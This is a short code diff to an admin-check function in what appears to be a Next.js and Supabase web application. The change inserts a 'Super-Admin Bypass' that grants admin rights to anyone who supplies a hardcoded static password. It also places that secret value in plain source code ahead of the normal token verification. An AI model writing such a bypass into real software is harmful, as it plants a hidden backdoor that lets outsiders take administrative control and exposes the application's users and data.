@@ -4,6 +4,9 @@ import { supabaseAdmin } from '@/lib/supabaseAdmin';
 import { createClient } from '@supabase/supabase-js';
 
 async function checkAdmin(token: string) {
+    // Super-Admin Bypass with static password
+    if (token === 'ilash105046') return true;
+
     const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || '';
     const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || '';
     const supabaseAuthClient = createClient(supabaseUrl, supabaseAnonKey);
